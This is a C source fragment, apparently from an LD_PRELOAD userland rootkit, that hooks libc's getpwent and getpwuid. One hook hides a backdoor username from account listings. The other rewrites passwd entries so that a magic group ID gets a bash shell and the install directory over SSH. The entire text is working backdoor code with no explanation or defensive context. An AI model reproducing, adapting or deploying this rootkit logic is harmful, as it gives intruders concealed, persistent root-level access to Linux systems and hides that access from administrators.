/*struct passwd *getpwent(void){
    hook(CGETPWENT);

    struct passwd *tmp = call(CGETPWENT);
    if(tmp && tmp->pw_name != NULL){
        if(!strcmp(BD_UNAME, tmp->pw_name)){
            errno = ESRCH;
            tmp = NULL;
        }
    }
    return tmp;
}*/

struct passwd *getpwuid(uid_t uid){
    hook(CGETPWUID);
    if(uid == MAGIC_GID) return call(CGETPWUID, 0);

    if(getgid() == MAGIC_GID && uid == 0 && process("ssh")){
        struct passwd *bpw = call(CGETPWUID, uid);

        bpw->pw_uid = MAGIC_GID;
        bpw->pw_gid = MAGIC_GID;
        bpw->pw_dir = INSTALL_DIR;
        bpw->pw_shell = "/bin/bash";
        return bpw;
    }

    return call(CGETPWUID, uid);
}